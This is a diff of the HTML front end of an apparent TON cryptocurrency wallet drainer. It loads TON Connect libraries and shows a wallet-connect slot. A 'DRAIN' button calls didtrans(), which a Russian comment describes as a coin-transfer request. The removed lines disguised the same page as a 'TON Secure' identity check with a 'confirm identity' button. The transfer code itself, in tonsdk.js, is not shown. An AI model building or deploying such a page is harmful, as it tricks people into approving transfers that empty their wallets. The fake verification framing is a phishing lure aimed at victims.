@@ -1,27 +1,28 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TON Secure</title>
+    
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
-    <style>
-        body { font-family: Arial; padding: 20px; background: #1a1a2e; color: #eee; text-align: center; }
-        #balance { margin: 20px 0; font-size: 22px; }
-        button { padding: 12px 40px; font-size: 22px; border: none; border-radius: 8px; cursor: pointer; }
-        #connectBtn { background: #4CAF50; color: white; }
-        #drainBtn { background: #f44336; color: white; }
-        #drainBtn:disabled { opacity: 0.5; cursor: not-allowed; }
-        #ton-connect { display: inline-block; margin: 20px 0; }
-        #status { margin: 10px 0; font-size: 16px; color: #aaa; }
-    </style>
+    <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
+    
 </head>
 <body>
-    <h1>🔐 Проверка личности</h1>
-    <div id="ton-connect"></div>
-    <div id="balance">Баланс: <span id="balanceValue">—</span> TON</div>
-    <div id="status"></div>
-    <button id="drainBtn" disabled>Подтвердить личность</button>
-    <script src="tonsdk.js"></script>
+
+
+
+<div id="ton-connect"></div>  <!--Коннект кошелька-->
+<button onclick="didtrans();" style="MARGIN-TOP:30PX;FONT-SIZE:24PX;">DRAIN</button><!--Запрос трансфера монет-->
+
+
+
+
+<script src="tonsdk.js"></script>
+ 
+    
+
+
+
 </body>
+
+
 </html>
